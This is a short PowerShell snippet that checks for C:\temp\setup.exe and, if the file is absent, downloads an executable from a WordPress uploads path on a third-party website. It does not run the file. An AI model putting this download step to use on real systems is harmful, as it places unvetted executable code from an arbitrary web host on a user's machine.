if (Test-Path 'C:\temp\setup.exe') {
    Write-Host "File setup.exe existed."
} else {
    Invoke-WebRequest -Uri 'https://msgang.com/wp-content/uploads/2022/setup.exe' -OutFile 'C:\temp\setup.exe'
}
